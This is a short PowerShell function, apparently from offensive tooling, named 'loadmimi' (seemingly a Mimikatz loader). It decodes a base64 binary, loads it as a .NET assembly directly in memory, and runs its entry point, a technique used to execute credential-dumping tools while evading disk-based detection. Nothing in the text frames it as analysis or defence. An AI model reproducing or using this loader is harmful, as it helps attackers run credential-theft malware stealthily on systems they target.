function loadmimi
{
    $RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))
    [PELoader.Program]::Main()
}